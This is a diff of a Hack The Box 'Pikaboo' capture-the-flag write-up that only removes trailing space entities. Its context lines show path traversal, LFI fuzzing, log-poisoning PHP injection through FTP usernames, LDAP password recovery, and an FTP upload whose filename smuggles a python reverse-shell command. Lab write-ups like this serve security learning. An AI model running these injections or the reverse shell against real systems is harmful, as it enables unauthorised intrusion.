@@ -83,7 +83,7 @@ Srv	PID	Acc	M	CPU 	SS	Req	Conn	Child	Slot	Client	VHost	Request
 4-0	4607	0/19820/29429	_ 	2.32	2	0	0.0	11.34	16.87 	127.0.0.1	localhost:81	GET /admin/../41221 HTTP/1.0
 ```
 
-There are loads of requests, and it seems that there's an extra directory at `admin_staging`. We can visit it using `http://10.129.95.191/admin../admin_staging/`.&#x20;
+There are loads of requests, and it seems that there's an extra directory at `admin_staging`. We can visit it using `http://10.129.95.191/admin../admin_staging/`.
 
 ### Admin Staging
 
@@ -91,7 +91,7 @@ This was a dashboard of some sort.
 
 <figure><img src="../../../.gitbook/assets/image (721).png" alt=""><figcaption></figcaption></figure>
 
-The URL is `http://10.129.95.191/admin../admin_staging/index.php?page=dashboard.php`. This could be vulnerable to LFI. I used `wfuzz` to see what files existed on the page using the LFI wordlist. Ideally, we are looking for some type of configuration files.&#x20;
+The URL is `http://10.129.95.191/admin../admin_staging/index.php?page=dashboard.php`. This could be vulnerable to LFI. I used `wfuzz` to see what files existed on the page using the LFI wordlist. Ideally, we are looking for some type of configuration files.
 
 ```
 $ wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hl=367 http://10.129.95.191/admin../admin_staging/index.php?page=FUZZ  
@@ -124,7 +124,7 @@ The weird part was that there was no password in sight, so we couldn't do much h
 
 ### FTP PHP Injection
 
-Notice that we are able to write to the logs via the username logins, and the page is in PHP. There's a chance that we have to do PHP injection via the username parameter in FTP. This might work because the FTP logs are displayed on the page, whereas the rest of the files aren't.&#x20;
+Notice that we are able to write to the logs via the username logins, and the page is in PHP. There's a chance that we have to do PHP injection via the username parameter in FTP. This might work because the FTP logs are displayed on the page, whereas the rest of the files aren't.
 
 I logged in with a unique username
 
@@ -140,7 +140,7 @@ ftp: Login failed
 ftp>
 ```
 
-Afterwards, I used the LFI to view the logs again, and I got a callback on `tcpdump`.&#x20;
+Afterwards, I used the LFI to view the logs again, and I got a callback on `tcpdump`.
 
 ```
 $ sudo tcpdump -i tun0 icmp           
@@ -271,7 +271,7 @@ www-data@pikaboo:/opt/pokeapi/config$ netstat -tulpn | grep 389
 tcp        0      0 127.0.0.1:389           0.0.0.0:*               LISTEN      - 
 ```
 
-The next step would be to enumerate LDAP via `ldapsearch`, which happened to be on the machine.&#x20;
+The next step would be to enumerate LDAP via `ldapsearch`, which happened to be on the machine.
 
 {% code overflow="wrap" %}
 ```
@@ -378,7 +378,7 @@ result: 0 Success
 
 We can find the user password in Base64 here, and when decoded it gives the password `_G0tT4_C4tcH'3m_4lL!_`
 
-We can't SSH in as the user with this, but we can access the FTP directory and place files.&#x20;
+We can't SSH in as the user with this, but we can access the FTP directory and place files.
 
 ```
 $ ftp 10.129.95.191                        
@@ -409,7 +409,7 @@ ftp> put test "|python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("\
 ```
 {% endcode %}
 
-Remember to have a backslash behind all spaces and spaces to allow the upload to work. After waiting for a little while, we would get a reverse shell on the specified port.&#x20;
+Remember to have a backslash behind all spaces and spaces to allow the upload to work. After waiting for a little while, we would get a reverse shell on the specified port.
 
 <figure><img src="../../../.gitbook/assets/image (2355).png" alt=""><figcaption></figcaption></figure>
 
